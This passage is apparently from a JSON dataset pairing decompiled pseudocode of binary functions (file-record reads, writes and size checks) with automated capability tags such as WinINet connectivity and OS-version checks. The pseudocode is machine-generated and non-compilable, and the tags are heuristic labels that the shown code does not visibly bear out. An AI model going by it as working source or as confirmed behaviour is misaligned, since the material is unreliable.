var_12ch + 1;\n        var_130h = var_130h + 1;\n    } while (uVar1 != 0);\n    fcn.00034a10(0x800db9e0);\n    var_4h = 1;\n    *arg_10h = 0xffffffff;\n    for (var_118h = 0; var_118h < 10; var_118h = var_118h + 1) {\n        if (*(var_118h * 4 + -0x7ff24618) == 0) {\n            *arg_10h = var_118h;\n        }\n        else {\n            var_13ch = *(*(var_118h * 4 + -0x7ff24618) + 0x40);\n            var_140h = arg_8h_00;\n            do {\n                uVar1 = *var_140h;\n                bVar7 = uVar1 < *var_13ch;\n                if (uVar1 != *var_13ch) {\ncode_r0x00020fba:\n                    var_148h = (1 - bVar7) - (bVar7 != 0);\n                    goto code_r0x00020fc5;\n                }\n                if (uVar1 == 0) break;\n                uVar1 = var_140h[1];\n                bVar7 = uVar1 < var_13ch[1];\n                if (uVar1 != var_13ch[1]) goto code_r0x00020fba;\n                var_140h = var_140h + 2;\n                var_13ch = var_13ch + 2;\n            } while (uVar1 != 0);\n            var_148h = 0;\ncode_r0x00020fc5:\n            if (var_148h == 0) {\n                fcn.000357f0(arg_8h_00);\n                *arg_10h = var_118h;\n                *(*(var_118h * 4 + -0x7ff24618) + 4) = *(*(var_118h * 4 + -0x7ff24618) + 4) + 1;\n                var_8h = 0;\n                goto code_r0x0002145a;\n            }\n        }\n    }\n    if (*arg_10h == 0xffffffff) {\n        var_8h = -1;\n    }\n    else {\n        var_120h = fcn.000356c0(0x6c);\n        if (var_120h == NULL) {\n            var_8h = -1;\n        }\n        else {\n            fcn.00078bfa(var_120h, 0, 0x6c);\n            var_120h[0x10] = arg_8h_00;\n            var_120h[0x11] = arg_14h;\n            uVar4 = (**(var_120h[0x11] + 4))(arg_8h, 0);\n            var_120h[0x12] = uVar4;\n            if (var_120h[0x12] == 0) {\n                var_8h = 3;\n            }\n            else {\n                var_120h[1] = 1;\n                while (iVar5 = (**(var_120h[0x11] + 0x14))(var_120h[0x12], var_120h + 2, 0x2c, 0),  iVar5 == 0) {\n                    uVar6 = (**(var_120h[0x11] + 0x10))(var_120h[0x12]);\n                    if (uVar6 == 0xffffffff) {\n                        var_8h = 3;\n                        goto code_r0x0002145a;\n                    }\n                    if (uVar6 < 0x2c) {\n                        var_8h = 3;\n                        goto code_r0x0002145a;\n                    }\n                    if (((var_120h[2] != uVar6) && (var_120h[2] = uVar6,  bVar2)) &&\n                       (iVar5 = fcn.00023e30(var_120h, 1),  iVar5 != 0)) {\n                        var_8h = 3;\n                        goto code_r0x0002145a;\n                    }\n                    if (((0x40000000 < var_120h[3]) || (0x40000000 < var_120h[4])) ||\n                       ((var_120h[4] <= var_120h[3] && var_120h[3] != var_120h[4] ||\n                        ((0x20000000 < var_120h[5] ||\n                         (var_120h[4] <= var_120h[3] + var_120h[5] && var_120h[3] + var_120h[5] != var_120h[4])))))) {\n                        var_8h = 3;\n                        goto code_r0x0002145a;\n                    }\n                    if (bVar2) {\n                        (**(var_120h[0x11] + 0x1c))(var_120h[0x12], 2);\n                        var_8h = fcn.00022c30(var_120h);\n                        if (var_8h != 0) goto code_r0x0002145a;\n                        bVar3 = true;\n                        var_120h[9] = 1;\n                        iVar5 = fcn.00023e30(var_120h, 0);\n                        if (iVar5 != 0) {\n                            var_8h = 3;\n                            goto code_r0x0002145a;\n                        }\n                        if (-1 < arg_ch) {\n                            fcn.00021740(*var_120h);\n                        }\n                        var_120h[0x13] = arg_ch;\n                        if ((0 < arg_ch) && (iVar5 = fcn.000344b0(var_120h + 0x14),  iVar5 != 0)) {\n                            fcn.0001ace0(var_120h + 0x15, 0x80061540, var_120h);\n                        }\n                        fcn.00034a10(0x800db9e0);\n                        var_4h = 1;\n                        *arg_10h = 0xffffffff;\n                        var_118h = 0;\n                        goto code_r0x00021412;\n                    }\n                    if ((var_120h[0xc] == 0) || (var_120h[0xc] == -0x33333334)) {\n                        uVar4 = fcn.00022b80(arg_8h_00);\n                        var_120h[0xc] = uVar4;\n                        iVar5 = fcn.00023e30(var_120h, 0);\n                        if (iVar5 != 0) {\n                            var_8h = 3;\n                            goto code_r0x0002145a;\n                        }\n                    }\n                    fcn.00078bfa(&var_110h, 0, 0x104);\n                    fcn.0002c4c0(&var_110h, 0x103, 0x80051a5c, 0x80051a20);\n                    iVar5 = fcn.00034aa0(var_120h + 0x17, &var_110h);\n                    if ((iVar5 != 0) && (iVar5 = fcn.00034b90(var_120h + 0x17, &var_110h),  iVar5 != 0)) {\n                        var_8h = -1;\n                        goto code_r0x0002145a;\n                    }\n                    fcn.00034a80(0x800db9e0);\n                    var_4h = 0;\n                    fcn.00034c70(var_120h + 0x17);\n                    bVar2 = true;\n                }\n                var_8h = 3;\n            }\n        }\n    }\ncode_r0x0002145a:\n    if (var_4h != 0) {\n        fcn.00034a80(0x800db9e0);\n    }\n    if ((var_120h != NULL) && (var_120h[0x12] != 0)) {\n        (**(var_120h[0x11] + 0x1c))(var_120h[0x12], 1);\n    }\n    if (bVar2) {\n        fcn.00034c90(var_120h + 0x17);\n    }\n    if (var_8h != 0) {\n        if (bVar3) {\n            fcn.00022f50(var_120h);\n        }\n        if (var_120h != NULL) {\n            if (var_120h[0x12] != 0) {\n                (**(var_120h[0x11] + 8))(var_120h[0x12]);\n            }\n            if (bVar2) {\n                fcn.00034c50(var_120h + 0x17);\n            }\n            fcn.000357f0(var_120h);\n        }\n        fcn.000357f0(arg_8h_00);\n    }\n    return var_8h;\ncode_r0x00021412:\n    if (9 < var_118h) goto code_r0x00021453;\n    if (*(var_118h * 4 + -0x7ff24618) == 0) {\n        *arg_10h = var_118h;\n        *(*arg_10h * 4 + -0x7ff24618) = var_120h;\n        var_8h = 0;\n        goto code_r0x0002145a;\n    }\n    var_118h = var_118h + 1;\n    goto code_r0x00021412;\ncode_r0x00021453:\n    var_8h = -1;\n    goto code_r0x0002145a;\n}\n",
        "token_count": 2717
    },
    "00021540": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.00021540(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint *var_4h;\n    \n    var_4h = arg_8h;\n    if (arg_8h != NULL) {\n        while (iVar1 = fcn.000345a0(var_4h + 0x14, 1800000),  iVar1 == 0) {\n            var_4h = *var_4h;\n            fcn.00021740(var_4h);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 142
    },
    "000215a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000215a0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_4h = fcn.00023cd0(&var_14h, arg_8h, 2, &var_10h);\n    if (var_4h == 0) {\n        var_8h = 1;\n        if ((arg_ch == 0) && (*(var_14h + 4) = *(var_14h + 4) + -1,  *(var_14h + 4) != 0)) goto code_r0x00021722;\n        if (0 < *(var_14h + 0x4c)) {\n            fcn.00023e00(&var_10h);\n            iVar1 = fcn.00037730(var_14h + 0x50);\n            if (iVar1 != 0) {\n                fcn.00034570(var_14h + 0x50);\n                iVar1 = fcn.00037730(var_14h + 0x54);\n                if (iVar1 != 0) {\n                    fcn.00037760(var_14h + 0x54, 0);\n                }\n                fcn.00034540(var_14h + 0x50);\n                iVar1 = fcn.00037730(var_14h + 0x54);\n                if (iVar1 != 0) {\n                    fcn.00037710(var_14h + 0x54);\n                }\n            }\n            var_4h = fcn.00023cd0(&var_14h, arg_8h, 2, &var_10h);\n        }\n    }\n    if (*(arg_8h * 4 + -0x7ff24618) != 0) {\n        (**(*(*(arg_8h * 4 + -0x7ff24618) + 0x44) + 8))(*(var_14h + 0x48));\n        fcn.00022f50(*(arg_8h * 4 + -0x7ff24618));\n        fcn.000357f0(*(*(arg_8h * 4 + -0x7ff24618) + 0x40));\n    }\n    if (var_4h == 0) {\n        fcn.00023e00(&var_10h);\n        var_8h = 0;\n        fcn.00034c50(var_14h + 0x5c);\n    }\n    fcn.000357f0(*(arg_8h * 4 + -0x7ff24618));\n    *(arg_8h * 4 + -0x7ff24618) = 0;\ncode_r0x00021722:\n    var_4h = 0;\n    if (var_8h != 0) {\n        fcn.00023e00(&var_10h);\n    }\n    return var_4h;\n}\n",
        "token_count": 703
    },
    "00021740": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00021740(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint var_130h;\n    int32_t var_12ch;\n    int32_t var_128h;\n    int32_t *var_124h;\n    int32_t *var_120h;\n    uint32_t var_11ch;\n    uint var_118h;\n    int32_t var_d4h;\n    uint var_d0h;\n    int32_t var_c8h;\n    int32_t var_a4h;\n    int32_t var_90h;\n    uint32_t var_8ch;\n    int32_t var_88h;\n    uint32_t var_84h;\n    int32_t var_80h;\n    uint var_7ch;\n    uint var_74h;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    int32_t var_38h;\n    int32_t var_14h;\n    \n    var_84h = 0;\n    var_44h = fcn.00023cd0(&var_90h, arg_8h, 1, &var_7ch);\n    if (var_44h != 0) {\n        return;\n    }\n    puVar2 = var_90h + 8;\n    puVar3 = &var_74h;\n    for (iVar1 = 0xb; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = *puVar2;\n        puVar2 = puVar2 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    if (*(var_90h + 0x20) == 0) {\n        var_80h = fcn.000232e0(var_90h, 0);\n        if (var_80h != *(var_90h + 8)) {\n            fcn.00023340(var_90h, var_80h);\n        }\n        goto code_r0x00021c57;\n    }\n    (**(*(var_90h + 0x44) + 0x1c))(*(var_90h + 0x48), 2);\n    var_8ch = 0x2c;\n    var_48h = 0;\n    do {\n        while( true ) {\n            while( true ) {\n                if (*(var_90h + 0x1c) <= var_8ch) goto code_r0x00021a5f;\n                iVar1 = (**(*(var_90h + 0x44) + 0x14))(*(var_90h + 0x48), &var_d0h, 0x40, var_8ch);\n                if (iVar1 != 0) goto code_r0x00021c57;\n                var_84h = var_8ch + 0x40 + var_a4h;\n                if (var_84h <= var_8ch) goto code_r0x00021a5f;\n                if (var_c8h == 0xffff) break;\n                var_8ch = var_8ch + 0x40 + var_a4h;\n                var_48h = var_48h + 1;\n            }\n            if (*(var_90h + 0x1c) <= var_84h) goto code_r0x00021a5f;\n            iVar1 = (**(*(var_90h + 0x44) + 0x14))(*(var_90h + 0x48), &var_40h, 0x40, var_84h);\n            if (iVar1 != 0) goto code_r0x00021c57;\n            var_88h = var_14h + 0x40;\n            if (var_38h != 0xffff) break;\n            var_a4h = var_a4h + var_88h;\n            iVar1 = (**(*(var_90h + 0x44) + 0x18))(*(var_90h + 0x48), &var_d0h, 0x40, var_8ch);\n            if (iVar1 != 0) goto code_r0x00021c57;\n        }\n        iVar1 = (**(*(var_90h + 0x44) + 0x14))(*(var_90h + 0x48), &var_118h, 0x40, var_8ch);\n        if ((iVar1 != 0) || (var_d4h = fcn.000356c0(var_88h),  var_d4h == 0)) goto code_r0x00021c57;\n        iVar1 = (**(*(var_90h + 0x44) + 0x14))(*(var_90h + 0x48), var_d4h, var_88h, var_84h);\n        if (iVar1 != 0) {\n            fcn.000357f0(var_d4h);\n            goto code_r0x00021c57;\n        }\n        iVar1 = (**(*(var_90h + 0x44) + 0x18))(*(var_90h + 0x48), var_d4h, var_88h, var_8ch);\n        if (iVar1 != 0) {\n            fcn.000357f0(var_d4h);\n            goto code_r0x00021c57;\n        }\n        fcn.000357f0(var_d4h);\n        iVar1 = (**(*(var_90h + 0x44) + 0x18))(*(var_90h + 0x48), &var_118h, 0x40, var_8ch + 0x40 + var_14h);\n    } while (iVar1 == 0);\ncode_r0x00021a5f:\n    *(var_90h + 0x1c) = var_8ch;\n    *(var_90h + 0x18) = var_48h;\n    *(var_90h + 0x20) = 0;\n    var_120h = &var_74h;\n    var_124h = var_90h + 8;\n    for (var_11ch = 0x2c; 3 < var_11ch; var_11ch = var_11ch - 4) {\n        if (*var_124h != *var_120h) goto code_r0x00021ae8;\n        var_120h = var_120h + 1;\n        var_124h = var_124h + 1;\n    }\n    if (var_11ch == 0) {\ncode_r0x00021bbe:\n        var_12ch = 0;\n    }\n    else {\ncode_r0x00021ae8:\n        var_128h = *var_124h - *var_120h;\n        if (var_128h == 0) {\n            if (var_11ch == 1) goto code_r0x00021bbe;\n            var_128h = *(var_124h + 1) - *(var_120h + 1);\n            if (var_128h == 0) {\n                if (var_11ch == 2) goto code_r0x00021bbe;\n                var_128h = *(var_124h + 2) - *(var_120h + 2);\n                if (var_128h == 0) {\n                    if ((var_11ch == 3) || (var_128h = *(var_124h + 3) - *(var_120h + 3),  var_128h == 0))\n                    goto code_r0x00021bbe;\n                }\n            }\n        }\n        var_12ch = 1;\n        if (var_128h < 1) {\n            var_12ch = -1;\n        }\n    }\n    if ((var_12ch == 0) || (iVar1 = fcn.00023e30(var_90h, 1),  iVar1 == 0)) {\n        fcn.00022c30(var_90h);\n        var_80h = fcn.000232e0(var_90h, 0);\n        if (var_80h != *(var_90h + 8)) {\n            fcn.00023340(var_90h, var_80h);\n        }\n    }\n    else {\n        fcn.00022f50(var_90h);\n    }\ncode_r0x00021c57:\n    (**(*(var_90h + 0x44) + 0x1c))(*(var_90h + 0x48), 1);\n    fcn.00023e00(&var_7ch);\n    return;\n}\n",
        "token_count": 1950
    },
    "00021c90": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00021c90(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    uint arg_8h_01;\n    uint var_58h;\n    uint var_28h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_4h;\n    \n    var_4h = fcn.00023cd0(&var_10h, arg_8h, 5, &var_ch);\n    if (var_4h == 0) {\n        fcn.000240f0(var_10h, &arg_ch);\n        arg_8h_01 = *(var_10h + 0x34);\n        arg_8h_00 = fcn.000232a0(arg_8h_01, arg_ch, arg_10h);\n        var_14h = fcn.000233f0(arg_8h_00, arg_8h_01);\n        if (var_14h == -1) {\n            var_4h = 5;\n        }\n        else {\n            iVar1 = (**(*(var_10h + 0x44) + 0x14))(*(var_10h + 0x48), &var_58h, 0x40, var_14h);\n            if (iVar1 == 0) {\n                var_28h = 0;\n                iVar1 = (**(*(var_10h + 0x44) + 0x18))(*(var_10h + 0x48), &var_58h, 0x40, var_14h);\n                if (iVar1 == 0) {\n                    var_4h = 0;\n                }\n                else {\n                    var_4h = 3;\n                }\n            }\n            else {\n                var_4h = 3;\n            }\n        }\n        fcn.00023e00(&var_ch);\n    }\n    return var_4h;\n}\n",
        "token_count": 462
    },
    "00021d70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00021d70(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint32_t arg_18h, uint arg_1ch)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    uint arg_8h_01;\n    uint var_58h;\n    uint auStack76 [13];\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_4h;\n    \n    if (arg_18h < 4) {\n        var_4h = fcn.00023cd0(&var_10h, arg_8h, 5, &var_ch);\n        if (var_4h == 0) {\n            fcn.000240f0(var_10h, &arg_ch);\n            arg_8h_01 = *(var_10h + 0x34);\n            arg_8h_00 = fcn.000232a0(arg_8h_01, arg_ch, arg_10h);\n            var_14h = fcn.000233f0(arg_8h_00, arg_8h_01);\n            if (var_14h == -1) {\n                var_4h = 5;\n            }\n            else {\n                iVar1 = (**(*(var_10h + 0x44) + 0x14))(*(var_10h + 0x48), &var_58h, 0x40, var_14h);\n                if (iVar1 == 0) {\n                    auStack76[arg_18h] = arg_1ch;\n                    iVar1 = (**(*(var_10h + 0x44) + 0x18))(*(var_10h + 0x48), &var_58h, 0x40, var_14h);\n                    if (iVar1 == 0) {\n                        var_4h = 0;\n                    }\n                    else {\n                        var_4h = 3;\n                    }\n                }\n                else {\n                    var_4h = 3;\n                }\n            }\n            fcn.00023e00(&var_ch);\n        }\n    }\n    else {\n        var_4h = -1;\n    }\n    return var_4h;\n}\n",
        "token_count": 511
    },
    "00021e60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00021e60(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint arg_ch_00;\n    uint32_t uVar1;\n    uint arg_8h_00;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_4h;\n    \n    var_4h = fcn.00023cd0(&var_10h, arg_8h, 1, &var_ch);\n    if (var_4h == 0) {\n        fcn.000240f0(var_10h, &arg_ch);\n        arg_8h_00 = *(var_10h + 0x34);\n        arg_ch_00 = fcn.000232a0(arg_8h_00, arg_ch, arg_10h);\n        fcn.00023480(var_10h, arg_ch_00, arg_8h_00);\n        if ((-1 < *(var_10h + 0x4c)) &&\n           (((1 < *(var_10h + 0x20) &&\n             (*(var_10h + 0x18) <= *(var_10h + 0x20) && *(var_10h + 0x20) != *(var_10h + 0x18))) ||\n            (uVar1 = (*(var_10h + 0x10) >> 10) / 100,  uVar1 <= *(var_10h + 0x20) && *(var_10h + 0x20) != uVar1)))) {\n            fcn.00021740(arg_8h);\n        }\n        fcn.00023e00(&var_ch);\n        var_4h = 0;\n    }\n    return var_4h;\n}\n",
        "token_count": 403
    },
    "00021f10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00021f10(uint arg_8h, uint *arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = fcn.00023cd0(&var_1ch, arg_8h, 1, &var_14h);\n    if (var_8h == 0) {\n        if (arg_10h == 0) {\n            var_8h = 0;\n        }\n        else {\n            var_4h = *arg_ch;\n            fcn.000240f0(var_1ch, &var_4h);\n            var_18h = fcn.000232a0(*(var_1ch + 0x34), var_4h, arg_ch[2]);\n            for (var_ch = 0; var_ch < arg_10h; var_ch = var_ch + 1) {\n                if (arg_ch[var_ch * 0x10 + 1] != -1) {\n                    fcn.000234c0(var_1ch, var_18h, arg_ch[var_ch * 0x10 + 1], 2);\n                }\n            }\n            fcn.00023660(var_18h);\n            var_8h = fcn.00023e30(var_1ch, 1);\n            if (var_8h == 0) {\n                if ((-1 < *(var_1ch + 0x4c)) &&\n                   (((1 < *(var_1ch + 0x20) &&\n                     (*(var_1ch + 0x18) <= *(var_1ch + 0x20) && *(var_1ch + 0x20) != *(var_1ch + 0x18))) ||\n                    (uVar1 = (*(var_1ch + 0x10) >> 10) / 100,  uVar1 <= *(var_1ch + 0x20) && *(var_1ch + 0x20) != uVar1)\n                    ))) {\n                    fcn.00021740(arg_8h);\n                }\n                var_8h = 0;\n            }\n        }\n        fcn.00023e00(&var_14h);\n    }\n    return var_8h;\n}\n",
        "token_count": 549
    },
    "00022040": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00022040(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, int32_t *arg_1ch)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    uint var_58h;\n    int32_t var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_2ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00023cd0(&var_14h, arg_8h, 1, &var_10h);\n    if (var_4h == 0) {\n        fcn.000240f0(var_14h, &arg_ch);\n        var_8h = fcn.000232a0(*(var_14h + 0x34), arg_ch, arg_10h);\n        if (var_8h == 0) {\n            var_4h = 5;\n        }\n        else {\n            var_18h = fcn.000233f0(var_8h, arg_14h);\n            if (var_18h == -1) {\n                var_4h = 5;\n            }\n            else {\n                iVar1 = (**(*(var_14h + 0x44) + 0x14))(*(var_14h + 0x48), &var_58h, 0x40, var_18h);\n                if (iVar1 == 0) {\n                    var_50h = arg_18h;\n                    arg_8h_00 = fcn.000232a0(*(var_14h + 0x34), arg_ch, arg_18h);\n                    iVar1 = fcn.000236f0(arg_8h_00);\n                    *arg_1ch = iVar1 + 1;\n                    var_54h = *arg_1ch;\n                    iVar1 = (**(*(var_14h + 0x44) + 0x18))(*(var_14h + 0x48), &var_58h, 0x40, var_18h);\n                    if (iVar1 == 0) {\n                        fcn.000234a0(var_14h, var_8h, arg_14h);\n                        fcn.00023130(var_14h, arg_ch, arg_18h, var_54h, var_4ch, var_18h, var_2ch);\n                        var_4h = 0;\n                    }\n                    else {\n                        var_4h = 3;\n                    }\n                }\n                else {\n                    var_4h = 3;\n                }\n            }\n        }\n        fcn.00023e00(&var_10h);\n    }\n    return var_4h;\n}\n",
        "token_count": 654
    },
    "000221a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl\nfcn.000221a0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h, int32_t arg_1ch, uint32_t arg_20h, \n            uint32_t *arg_24h)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    uint arg_8h_01;\n    uint32_t var_5ch;\n    uint var_58h;\n    uint var_34h;\n    int32_t var_2ch;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    if ((arg_1ch == 0) || (arg_24h == NULL)) {\n        var_4h = 0xffffffff;\n    }\n    else {\n        var_4h = fcn.00023cd0(&var_10h, arg_8h, 0, &var_ch);\n        if (var_4h == 0) {\n            fcn.000240f0(var_10h, &arg_ch);\n            arg_8h_01 = *(var_10h + 0x34);\n            arg_8h_00 = fcn.000232a0(arg_8h_01, arg_ch, arg_10h);\n            var_14h = fcn.000233f0(arg_8h_00, arg_8h_01);\n            if (var_14h == -1) {\n                var_4h = 5;\n            }\n            else {\n                (**(*(var_10h + 0x44) + 0x14))(*(var_10h + 0x48), &var_58h, 0x40, var_14h);\n                var_34h = fcn.00036320(0);\n                (**(*(var_10h + 0x44) + 0x18))(*(var_10h + 0x48), &var_58h, 0x40, var_14h);\n                if (var_2ch - arg_18h < arg_20h) {\n                    var_5ch = var_2ch - arg_18h;\n                }\n                else {\n                    var_5ch = arg_20h;\n                }\n                *arg_24h = var_5ch;\n                iVar1 = (**(*(var_10h + 0x44) + 0x14))(*(var_10h + 0x48), arg_1ch, *arg_24h, var_14h + 0x40 + arg_18h);\n                var_4h = -(iVar1 != 0) & 3;\n            }\n            fcn.00023e00(&var_ch);\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 633
    },
    "000222d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.000222d0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h, int32_t arg_1ch, int32_t arg_20h)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    uint arg_8h_01;\n    uint var_58h;\n    uint var_30h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_4h;\n    \n    if ((arg_1ch == 0) && (arg_20h != 0)) {\n        var_4h = -1;\n    }\n    else {\n        var_4h = fcn.00023cd0(&var_10h, arg_8h, 5, &var_ch);\n        if (var_4h == 0) {\n            fcn.000240f0(var_10h, &arg_ch);\n            arg_8h_01 = *(var_10h + 0x34);\n            arg_8h_00 = fcn.000232a0(arg_8h_01, arg_ch, arg_10h);\n            var_14h = fcn.000233f0(arg_8h_00, arg_8h_01);\n            if (var_14h == -1) {\n                var_4h = 5;\n            }\n            else {\n                iVar1 = (**(*(var_10h + 0x44) + 0x14))(*(var_10h + 0x48), &var_58h, 0x40, var_14h);\n                if (iVar1 == 0) {\n                    if (var_2ch < arg_18h + arg_20h) {\n                        var_4h = 6;\n                    }\n                    else {\n                        var_30h = fcn.00036320(0);\n                        if (var_28h < arg_18h + arg_20h) {\n                            var_28h = arg_18h + arg_20h;\n                        }\n                        iVar1 = (**(*(var_10h + 0x44) + 0x18))\n                                          (*(var_10h + 0x48), arg_1ch, arg_20h, var_14h + 0x40 + arg_18h);\n                        if (iVar1 == 0) {\n                            iVar1 = (**(*(var_10h + 0x44) + 0x18))(*(var_10h + 0x48), &var_58h, 0x40, var_14h);\n                            if (iVar1 == 0) {\n                                var_4h = 0;\n                            }\n                            else {\n                                var_4h = 3;\n                            }\n                        }\n                        else {\n                            var_4h = 3;\n                        }\n                    }\n                }\n                else {\n                    var_4h = 3;\n                }\n            }\n            fcn.00023e00(&var_ch);\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 705
    },
    "00022430": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x000224dc)\n\nint32_t __cdecl\nfcn.00022430(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint32_t arg_18h, uint *arg_1ch, int32_t *arg_20h)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint64_t uVar3;\n    uint64_t uVar4;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    int32_t var_58h;\n    uint var_54h;\n    int32_t var_4ch;\n    uint var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint32_t var_1ch;\n    int32_t var_4h;\n    \n    if (arg_20h == NULL) {\n        return -1;\n    }\n    var_4ch = fcn.00023cd0(&var_58h, arg_8h, 1, &var_54h);\n    if (var_4ch != 0) {\n        return var_4ch;\n    }\n    fcn.000240f0(var_58h, &arg_ch);\n    if (*(var_58h + 0x28) != '\\0') {\n        uVar3 = fcn.00078be2(*(var_58h + 0x28), 0, *(var_58h + 0x10), 0);\n        uVar1 = fcn.00023840(var_58h, arg_ch, arg_10h);\n        uVar4 = fcn.00078be2(uVar1 + arg_18h, (uVar1 >> 0x1f) + CARRY4(uVar1, arg_18h), 100, 0);\n        if (uVar3 < uVar4) {\n            var_4ch = 7;\n            goto code_r0x000225da;\n        }\n    }\n    fcn.00078bfa(&var_48h, 0, 0x40);\n    var_3ch = arg_14h;\n    var_48h = arg_ch;\n    var_28h = fcn.00036320(0);\n    var_24h = 0;\n    var_1ch = arg_18h;\n    var_40h = arg_10h;\n    var_20h = 0;\n    if (arg_1ch != NULL) {\n        var_38h = *arg_1ch;\n        var_34h = arg_1ch[1];\n        var_30h = arg_1ch[2];\n        var_2ch = arg_1ch[3];\n    }\n    uVar2 = fcn.000232a0(*(var_58h + 0x34), arg_ch, arg_10h);\n    var_44h = fcn.000236f0(uVar2);\n    var_44h = var_44h + 1;\n    *arg_20h = var_44h;\n    var_4h = fcn.00023720(var_58h, &var_48h);\n    if (var_4h == -1) {\n        var_4ch = 4;\n    }\n    else {\n   